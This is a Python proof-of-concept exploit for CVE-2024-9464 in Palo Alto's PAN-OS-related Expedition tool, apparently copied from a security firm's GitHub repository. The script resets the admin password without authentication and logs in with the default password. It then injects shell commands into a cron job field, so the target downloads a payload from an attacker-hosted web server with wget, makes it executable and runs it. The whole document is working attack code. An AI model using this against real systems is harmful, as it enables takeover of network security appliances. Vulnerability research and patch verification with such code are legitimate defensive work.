# paloalto_auth_rce
from: https://github.com/horizon3ai/CVE-2024-9464/blob/main/CVE-2024-9464.py
product: PAN-OS
```
#!/usr/bin/python3
import argparse
import requests
import urllib3
import random
import string
import sys
import socketserver
import time
import threading
from http.server import SimpleHTTPRequestHandler
from requests.exceptions import ReadTimeout
urllib3.disable_warnings()

def _start_web_server(listen_ip, listen_port):
    try:
        httpd = socketserver.TCPServer((listen_ip, listen_port), SimpleHTTPRequestHandler)
        httpd.timeout = 60
        httpd.serve_forever()
    except Exception as e:
        sys.stderr.write(f'[!] Error starting web server: {e}\n')

def serve():
    print(f'[*] Starting web server at {args.listen_ip}:{args.listen_port}')
    ft = threading.Thread(target=_start_web_server, args=(args.listen_ip,args.listen_port), daemon=True)
    ft.start()
    time.sleep(3)

def reset_admin_password(url: str):
    print(f'[*] Sending reset request to server...')
    r = requests.post(f'{url}/OS/startup/restore/restoreAdmin.php', verify=False, timeout=30)
    if r.status_code == 200:
        print(f'[*] Admin password reset successfully')
    else:
        print(f'[-] Unexpected response during reset: {r.status_code}:{r.text}')
        sys.exit(1)


def get_session_key(url: str):
    print(f'[*] Retrieving session key...')
    session = requests.Session()
    data = {'action': 'get',
            'type': 'login_users',
            'user': 'admin',
            'password': 'paloalto',
            }
    r = session.post(f'{url}/bin/Auth.php', data=data, verify=False, timeout=30)
    if r.status_code == 200:
        session_key = r.headers.get('Set-Cookie')
        if 'PHPSESSID' in session_key:
            print(f'[*] Session key successfully retrieved')
            csrf_token = r.json().get('csrfToken')
            session.headers['Csrftoken'] = csrf_token
            return session

    print(f'[-] Unexpected response during authentication: {r.status_code}:{r.text}')
    sys.exit(1)


def add_blank_cronjob(url: str, session):
    print(f'[*] Adding empty cronjob database entry...')
    data = {'action': 'add',
            'type': 'new_cronjob',
            'project': 'pandb',
            }
    r = session.post(f'{url}/bin/CronJobs.php', data=data, verify=False, timeout=30)
    if r.status_code == 200 and r.json().get('success', False):
        print(f'[*] Successfully added cronjob database entry')
        return

    print(f'[-] Unexpected response adding cronjob: {r.status_code}:{r.text}')
    sys.exit(1)


def edit_cronjob(url, session, command):
    print(f'[*] Inserting: {command}')
    print(f'[*] Inserting malicious command into cronjob database entry...')
    data = {'action': 'set',
            'type': 'cron_jobs',
            'project': 'pandb',
            'name': 'test',
            'cron_id': '1',
            'recurrence': 'Daily',
            'start_time': f'"; {command} ;',
            }
    try:
        r = session.post(f'{url}/bin/CronJobs.php', data=data, verify=False, timeout=30)
        if r.status_code == 200:
            print(f'[+] Successfully edited cronjob - check for blind execution!')
            return

        print(f'[-] Unexpected response editing cronjob: {r.status_code}:{r.text}')
        sys.exit(1)
    except TimeoutError:
        # Expected to timeout given it keeps connection open for process duration
        pass
    except ReadTimeout:
        # Expected to timeout given it keeps connection open for process duration
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The URL of the target', type=str, required=True)
    parser.add_argument('-c', '--cmd_file', help='The commands to execute blind', type=str, required=True)
    parser.add_argument('-li', '--listen_ip', help='local IP to bind to')
    parser.add_argument('-lp', '--listen_port', required=False, help='local HTTP port to bind to, for blind RCE mode', default=8000, type=int)
    args = parser.parse_args()

    serve()
    reset_admin_password(args.url)
    session = get_session_key(args.url)
    add_blank_cronjob(args.url, session)
    filename = random.choice(string.ascii_letters)
    cmd_wrapper = [
        f'wget {args.listen_ip}$(echo $PATH|cut -c16){args.listen_port}/{args.cmd_file} -O /tmp/{filename}',
        f'chmod 777 /tmp/{filename}',
        f'/tmp/{filename}',
        f'rm /tmp/{filename}'
    ]
    for cmd in cmd_wrapper:
        edit_cronjob(args.url, session, cmd)
        time.sleep(1)


```
